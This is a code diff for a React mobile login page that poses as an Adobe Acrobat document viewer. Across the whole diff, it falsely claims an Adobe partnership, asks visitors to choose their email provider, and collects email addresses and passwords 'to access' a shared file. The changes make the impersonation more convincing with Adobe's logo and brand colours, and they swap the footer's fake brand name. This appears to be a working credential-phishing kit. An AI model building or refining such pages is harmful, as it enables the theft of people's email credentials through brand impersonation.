@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
+import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../../hooks/useLogin';
 import Spinner from '../../components/common/Spinner';
 
@@ -75,106 +75,98 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   };
 
   const AdobeLogo = () => (
-    <img 
-      src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
-      alt="Adobe Acrobat Reader Logo" 
-      className="w-9 h-9 drop-shadow-lg"
-    />
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-7 h-7">
+      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
+      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
+      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
+    </svg>
   );
 
   return (
-    <div 
-      className="min-h-screen flex flex-col justify-end font-sans bg-cover bg-center"
-      style={{
-        backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
-      }}
-    >
+    <div className="min-h-screen flex flex-col font-sans bg-white">
       {!selectedProvider ? (
-        <>
-          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
+        <div className="flex-1 flex flex-col justify-center px-6 py-8">
+          <div className="mb-8 text-center">
             <div className="flex justify-center mb-4">
               <AdobeLogo />
             </div>
-            <h1 className="text-xl font-bold text-gray-900">Sign in to continue</h1>
-            <p className="text-gray-800 mt-2 text-sm font-medium">
-              to access <span className="font-bold text-gray-900">{fileName}</span>
+            <h1 className="text-lg font-semibold text-gray-900 mb-1">Sign in to access your document</h1>
+            <p className="text-sm text-gray-500">
+              <span className="font-medium text-gray-700">{fileName}</span>
             </p>
           </div>
 
-          <div className="p-6">
-            <p className="text-center text-base font-bold text-gray-900 mb-5 drop-shadow-[0_1px_3px_rgba(255,255,255,0.8)]">Choose your email provider</p>
-            <div className="space-y-2.5">
-              {emailProviders.map((provider) => (
-                <button
-                  key={provider.name}
-                  onClick={() => handleProviderClick(provider.name)}
-                  type="button"
-                  className="w-full group"
-                >
-                  <div className="flex items-center px-4 py-3 bg-white/75 backdrop-blur-md rounded-xl border border-white/40 active:bg-white/90 active:scale-[0.98] transition-all duration-200 shadow-lg">
-                    <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0 drop-shadow-sm" />
-                    <span className="flex-1 text-base font-semibold text-gray-700 ml-4">
-                      {provider.name}
-                    </span>
-                    <svg className="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                    </svg>
-                  </div>
-                </button>
-              ))}
-            </div>
-            <div className="mt-8 text-center">
-              <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2026 Docsfilebloom.com. Secured in partnership with Adobe®.</p>
-            </div>
-          </div>
-        </>
-      ) : (
-        <>
-          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
-            <div className="flex justify-center mb-4">
-              <AdobeLogo />
-            </div>
-            <h1 className="text-xl font-bold text-gray-900">Sign in with {selectedProvider}</h1>
-            <p className="text-gray-800 mt-2 text-sm font-medium">
-              to access <span className="font-bold text-gray-900">{fileName}</span>
-            </p>
-          </div>
-
-          <div className="bg-white/60 backdrop-blur-md rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-white/30">
-            <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 active:text-gray-900 font-medium mb-6">
-              <ArrowLeft className="w-4 h-4" />
-              Change provider
-            </button>
-
-            <form onSubmit={handleSubmit} className="space-y-5">
-              {errorMessage && ( <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200/50"> {errorMessage} </div> )}
-              <div>
-                <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
-                <div className="relative mt-2">
-                  <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
-                  <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-11 pr-4 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
+          <p className="text-sm font-medium text-gray-700 mb-3">Choose your email provider</p>
+          <div className="space-y-2">
+            {emailProviders.map((provider) => (
+              <button
+                key={provider.name}
+                onClick={() => handleProviderClick(provider.name)}
+                type="button"
+                className="w-full group"
+              >
+                <div className="flex items-center px-4 py-3 bg-white rounded-md border border-gray-200 active:bg-gray-50 transition-all duration-150">
+                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
+                  <span className="flex-1 text-sm font-medium text-gray-800 ml-3 text-left">
+                    {provider.name}
+                  </span>
+                  <svg className="w-4 h-4 text-gray-400 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                  </svg>
                 </div>
-              </div>
-              <div>
-                <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
-                <div className="relative mt-2">
-                  <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
-                  <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-11 pr-12 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
-                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-800">
-                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                  </button>
-                </div>
-              </div>
-              <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-4 px-4 rounded-xl font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/30">
-                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-                {isLoading ? 'Verifying...' : 'Sign In'}
               </button>
-            </form>
+            ))}
           </div>
-          <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
-            <p className="text-xs text-gray-600 text-center">© 2026 Docsfilebloom.com. Secured in partnership with Adobe®.</p>
+          <div className="mt-8 text-center">
+            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
           </div>
-        </>
+        </div>
+      ) : (
+        <div className="flex-1 flex flex-col justify-center px-6 py-8">
+          <div className="mb-6 text-center">
+            <div className="flex justify-center mb-4">
+              <AdobeLogo />
+            </div>
+            <h1 className="text-lg font-semibold text-gray-900">Sign in with {selectedProvider}</h1>
+            <p className="text-sm text-gray-500 mt-1">
+              to access <span className="font-medium text-gray-700">{fileName}</span>
+            </p>
+          </div>
+
+          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-blue-600 active:text-blue-800 font-medium mb-5 transition-colors">
+            <ArrowLeft className="w-4 h-4" />
+            Change provider
+          </button>
+
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {errorMessage && (
+              <div className="bg-red-50 text-red-600 p-3 rounded-md text-sm font-medium border border-red-200">
+                {errorMessage}
+              </div>
+            )}
+            <div>
+              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="email">Email address</label>
+              <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-3 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
+            </div>
+            <div>
+              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="password">Password</label>
+              <div className="relative">
+                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-3 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
+                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
+                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+            </div>
+            <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 transition-colors">
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Sign In'}
+            </button>
+          </form>
+
+          <div className="mt-8 text-center">
+            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
+          </div>
+        </div>
       )}
     </div>
   );
